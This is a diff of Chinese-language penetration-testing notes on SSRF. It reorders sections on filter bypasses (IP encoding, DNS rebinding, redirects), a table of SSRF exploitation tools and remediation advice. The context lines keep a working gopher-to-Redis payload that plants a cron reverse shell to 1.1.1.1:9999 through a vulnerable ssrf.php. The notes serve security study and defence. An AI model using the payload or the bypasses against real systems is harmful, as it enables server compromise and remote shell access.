@@ -96,7 +96,45 @@ ssrf
 [SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`
 
 
-### 利用cURL的多种协议
+### 绕过技巧
+
+  * 使用@绕过不严谨的过滤 `a.com@10.10.10.10` `a.com:b@10.10.10.10`
+  * IP地址变形 - 进制转换 `127.0.0.1 => 2130706433`
+  * 域名解析 - `10.100.21.7 => http://10.100.21.7.xip.io 或 http://www.10.100.21.7.xip.name`[有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
+  * DNS重绑定 DNS Rebinding
+    * 攻击者提交参数给后端
+    * 后端验证:对hack.cn进行第1次域名解析 得到了合法的外网ip(hack.cn的DNS服务器设置为TTL=0) 该域名对应的ip非内网 域名验证通过
+    * 攻击者修改域名解析:(此时攻击者利用短暂的时间差 修改域名解析的ip为内网ip)
+    * 后端逻辑继续运行:后端的程序逻辑继续使用刚才的域名hack.cn(由于hack.cn的DNS服务器设置的TTL为0 后端只能第2次对hack.cn进行域名解析)
+    * 后端使用了解析得到的内网ip
+  * 短网址跳转 -  永久重定向(301)到内网地址 `http://10.10.116.11 => http://t.cn/RwbLKDx`[有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
+  * JS跳转
+  * 以下工具
+
+SSRF测试工具/利用工具
+
+|名称|属性|描述|
+|:-------------:|--|-----|
+|[cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)|python|生成不同形式的SSRF payload (IP obfuscator ...)|
+|[D4Vinci/Cuteit(IP obfuscator)](https://github.com/D4Vinci/Cuteit)|python2|IP obfuscator 将恶意IP改为各种格式以绕过安全检测|
+|[samhaxr/XXRF-Shots](https://github.com/samhaxr/XXRF-Shots)|node.js|生成payload 发送众多请求 并使用phantomJS实现网页截图|
+|[swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)|python3|Automatic SSRF fuzzer and exploitation(RCE...) tool|
+|[tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)|python2|生成gopher link 以利用SSRF实现RCE. This tool generates gopher link for exploiting SSRF and gaining RCE in various servers |
+
+### 修复方式
+
+* 禁用协议 - 仅允许必要的协议 如http和https
+* 禁止跳转
+  * 301 redirect 永久性转移(Permanently Moved)
+  * 302 redirect 暂时性转移(Temporarily Moved)
+* 严格限制参数值内容-域名白名单
+* 严格限制参数值长度
+
+
+-------
+
+
+### 附-利用cURL支持的协议
 
 cURL支持的协议很多
 ```
@@ -129,31 +167,3 @@ curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d
 # 远程测试 方式3
 curl -v 'http://xxx.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F1.1.1.1%2F9999%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
 ```
-
-### 绕过技巧
-  * 使用@绕过不严谨的过滤 `a.com@10.10.10.10` `a.com:b@10.10.10.10`
-  * IP地址变形 - 进制转换 `127.0.0.1 => 2130706433`
-  * 域名解析 - `10.100.21.7 => http://10.100.21.7.xip.io 或 http://www.10.100.21.7.xip.name`[有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
-  * DNS Rebinding - 第1次域名解析为外网ip 第2次内网ip
-  * 短网址跳转到内网地址 `http://10.10.116.11 => http://t.cn/RwbLKDx`[有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
-  * JS跳转
-  * 以下工具
-
-SSRF测试工具/利用工具
-
-|名称|属性|描述|
-|:-------------:|--|-----|
-|[cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)|python|生成不同形式的SSRF payload (IP obfuscator ...)|
-|[D4Vinci/Cuteit(IP obfuscator)](https://github.com/D4Vinci/Cuteit)|python2|IP obfuscator 将恶意IP改为各种格式以绕过安全检测|
-|[samhaxr/XXRF-Shots](https://github.com/samhaxr/XXRF-Shots)|node.js|生成payload 发送众多请求 并使用phantomJS实现网页截图|
-|[swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)|python3|Automatic SSRF fuzzer and exploitation(RCE...) tool|
-|[tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)|python2|生成gopher link 以利用SSRF实现RCE. This tool generates gopher link for exploiting SSRF and gaining RCE in various servers |
-
-### 修复方式
-
-* 禁用协议 - 仅允许必要的协议 如http和https
-* 禁止跳转
-  * 301 redirect 永久性转移(Permanently Moved)
-  * 302 redirect 暂时性转移(Temporarily Moved)
-* 严格限制参数值内容-域名白名单
-* 严格限制参数值长度
